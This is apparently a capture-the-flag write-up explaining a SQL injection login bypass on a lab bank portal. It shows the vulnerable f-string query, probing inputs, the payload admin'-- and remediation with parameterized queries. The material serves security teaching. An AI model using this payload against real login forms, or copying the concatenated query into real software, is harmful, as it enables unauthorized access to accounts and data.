# Challenge 01 — Vault Access (SQL Injection Authentication Bypass)
(link to doc : https://docs.google.com/document/d/1v9MLq1AgFBR-dRXinL8hMIy63-k3XDA-ruP-VZBXDZE/edit?usp=sharing )

## Challenge Overview

### Description

ScalerBank's employee portal requires a username and password before granting access to the employee dashboard. The flag is stored in the `employee_secrets` table under the name `vault_flag`.

### Goal

Log into the employee portal without valid credentials and retrieve the vault flag.

### Hint

> "Sometimes the difference between wrong password and welcome back is decided by more than the password field."

The hint implies the authentication decision depends on more than just the password — the SQL query structure itself can be manipulated.

---

## Vulnerability

- **Class:** SQL Injection (Authentication Bypass)
- **Location:** `main.py`, `/employee-portal` route
- **Cause:** User input concatenated directly into SQL query without parameterization

```python
sql = f"SELECT * FROM employees WHERE username='{username}' AND password='{password}'"
row = get_db().execute(sql).fetchone()
```

The `username` and `password` fields are interpolated directly into the SQL string with no escaping.

---

## Testing & Confirmation

| Input | Output | Result |
|-------|--------|--------|
| Valid credentials | Employee dashboard with flag | Normal authentication |
| Invalid credentials | "Invalid employee credentials." | Failed authentication |
| `username=admin'` | Database error | Unclosed quote — confirms injection |
| `username=admin'--` | Employee dashboard with flag | Password check bypassed |

---

## Exploitation

### Payload

| Field | Value |
|-------|-------|
| username | `admin'--` |
| password | `anything` |

### Why It Works

The resulting SQL query becomes:

```sql
SELECT * FROM employees WHERE username='admin'--' AND password='anything'
```

The `--` is SQL's single-line comment operator. Everything after it — including the password check — is ignored. The query effectively becomes:

```sql
SELECT * FROM employees WHERE username='admin'
```

This returns the admin employee row, causing the condition `if row:` to be `True`, and the flag is displayed.

### Expected Result

The employee dashboard loads successfully, displaying the vault flag.

---

## Flag Retrieval

Submit the crafted payload. The vault flag appears on the employee dashboard page, sourced from the `employee_secrets` table:

```
# The flag is rendered in employee_dashboard.html:
# {{ vault_flag }}
```

The flag format is: `FLAG{vault_<8-char-hex>}`

---

## Root Cause

The developer built the SQL query by string concatenation instead of using parameterized queries:

```python
sql = f"SELECT * FROM employees WHERE username='{username}' AND password='{password}'"
```

This is the textbook anti-pattern for database access.

---

## Remediation

Use parameterized queries (prepared statements) so user input is treated as data, not executable SQL:

```python
sql = "SELECT * FROM employees WHERE username=? AND password=?"
row = qry(sql, (username, password), one=True)
```

Additional measures:
- Apply the principle of least privilege to the database connection.
- Use an ORM that handles query parameterization automatically.
- Log and alert on SQL errors that indicate probing.

---

## Key Takeaways

- **Vulnerability:** SQL Injection via string concatenation in authentication queries.
- **Exploitation Path:** Inject a SQL comment to bypass the password check.
- **Security Lesson:** Never build SQL queries by concatenating user input. Always use parameterized queries.
